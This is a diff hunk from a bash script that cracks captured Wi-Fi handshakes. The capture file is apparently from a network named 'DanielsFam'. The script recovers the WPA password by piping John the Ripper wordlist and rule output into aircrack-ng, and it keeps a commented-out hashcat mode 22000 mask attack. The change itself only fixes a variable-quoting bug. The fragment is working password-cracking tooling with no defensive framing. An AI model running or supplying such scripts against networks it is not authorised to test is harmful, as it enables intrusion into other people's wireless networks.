@@ -128,7 +128,7 @@ sudo /usr/bin/hcxpcapngtool -o /opt/backup/root/handshakes/DanielsFam.pcapng /ho
 
 if [[ ${ripperchoice} -eq 1 ]]; then
   # Crack the hash with John the Ripper using the OneRuleToRuleThemAll.rule
-  john --wordlist=$"{WORDLIST}" --rules="${RULES}" --stdout | aircrack-ng -w - -e SSID /opt/backup/root/handshakes/hashes.22000 -J /opt/backup/root/handshakes/cracked.txt
+  john --wordlist=${WORDLIST} --rules="${RULES}" --stdout | aircrack-ng -w - -e SSID /opt/backup/root/handshakes/hashes.22000 -J /opt/backup/root/handshakes/cracked.txt
 elif [[ "${ripperchoice}" -eq 2 ]]; then
   # Crack the hash with hashcat
 #  hashcat -m 22000 -a 1 -w 4 -o /opt/backup/root/handshakes/cracked.txt --force --opencl-device-types=1,2 ${WORDLIST} ?d?d?d?d?d?d?d?d?d --increment-min=8 --rule-file=OneRuleToRuleThemAll.rule /opt/backup/root/handshakes/hashes.22000
